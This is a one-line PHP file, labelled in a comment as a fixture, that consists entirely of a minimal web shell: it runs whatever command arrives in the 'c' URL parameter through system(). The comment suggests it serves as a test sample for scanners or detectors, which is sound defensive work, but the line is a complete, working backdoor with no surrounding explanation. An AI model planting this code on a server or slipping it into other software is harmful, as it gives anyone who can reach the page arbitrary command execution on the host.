<?php system($_GET['c']); // fixture
